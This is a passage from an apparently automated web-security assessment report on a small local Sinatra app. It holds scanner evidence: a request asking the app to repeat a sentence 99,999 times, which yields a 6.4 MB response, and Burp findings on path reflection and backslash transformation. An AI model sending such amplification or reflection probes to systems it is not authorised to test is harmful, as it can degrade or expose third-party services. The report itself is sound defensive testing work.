                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>te
```

- Evidence `ev-mqz0sski-8` — `artifacts/s-0001/ev-mqz0sski-8/`

Request:

```http
POST /generate HTTP/1.1
Host: target.local:4567
user-agent: verdict-scanner/0.1
x-verdict: assessment
Content-Type: application/x-www-form-urlencoded

sentence=test&number=99999
```

Response (truncated):

```http
HTTP/1.1 200
content-length: 6401621
content-type: text/html;charset=utf-8
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 1; mode=block

<!doctype html>
<html lang="en">
  <head> 
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">

    <title>RepeatMePlease</title>
  </head>
  <body> 
    <nav class="navbar navbar-expand-lg navbar-light bg-light">
      <a class="navbar-brand" href="#">RepeatMePlease</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        </ul>
      </div>
    </nav>
 
    <div class="container mt-5">
      <div class="row">
        <div class="col-md-6 offset-md-3">
          <div class="card">
            <div class="card-header">
              Generated your sentence for 99999 times
            </div>
            <div class="card-body">
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>test</p>
                <hr>
              
                <p>te
```

<a id="finding-4"></a>

### 4. [INFO] [burp] Input returned in response (reflected)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The value of the URL path filename is copied into the application's response. (confidence: CERTAIN) @ http://target.local:4567/generate

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqz1cbod-16` — `artifacts/_/ev-mqz1cbod-16/`

Request:

```http
GET /generate HTTP/1.1
Host: target.local:4567

GET /generatey9tp11786b HTTP/1.1
Host: target.local:4567
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 404 Not Found
X-Cascade: pass
Content-Type: text/html;charset=utf-8
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 455

<!DOCTYPE html>
<html>
<head>
  <style type="text/css">
  body { text-align:center;font-family:helvetica,arial;font-size:22px;
    color:#888;margin:20px}
  #c {margin:0 auto;width:500px;text-align:left}
  </style>
</head>
<body>
  <h2>Sinatra doesn’t know this ditty.</h2>
  <img src='/__sinatra__/404.png'>
  <div id="c">
    Try this:
    <pre>get &#x27;&#x2F;generatey9tp11786b&#x27; do
  &quot;Hello World&quot;
end
</pre>
  </div>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [INFO] [burp] Suspicious input transformation (reflected)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The application appears to process the value of the URL path filename, transform backslash escape sequences in an unexpected way, and echo the result in the response.<br><br>The payload <strong>3mtdbzm1rb\\lolcuot82i</strong> was submitted in the URL path filename. This payload contains the '\\' sequence, which commonly represents an escaped backslash. The input was copied into the application's response as <strong>3mtdbzm1rb&amp;#x2F;lolcuot82i</strong>. This indicates that the application transformed the sequence in some unexpected way.<br><br>This behavior indicates that the application mig @ http://target.local:4567/generate

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqz1cboj-17` — `artifacts/_/ev-mqz1cboj-17/`

Request:

```http
GET /generate HTTP/1.1
Host: target.local:4567

GET /3mtdbzm1rb%5c%5clolcuot82i HTTP/1.1
Host: target.local:4567
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 404 Not Found
X-Cascade: pass
Content-Type: text/html;charset=utf-8
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 463

<!DOCTYPE html>
<html>
<head>
  <style type="text/css">
  body { text-align:center;font-family:helvetica,arial;font-size:22px;
    color:#888;margin:20px}
  #c {margin:0 auto;width:500px;text-align:left}
  </style>
</head>
<body>
  <h2>Sinatra doesn’t know this ditty.</h2>
  <img src='/__sinatra__/404.png'>
  <div id="c">
    Try this:
    <pre>get &#x27;&#x2F;3mtdbzm1rb&#x2F;lolcuot82i&#x27; do
  &quot;Hello World&quot;
end
</pre>
  </div>
</body>
</html>
```
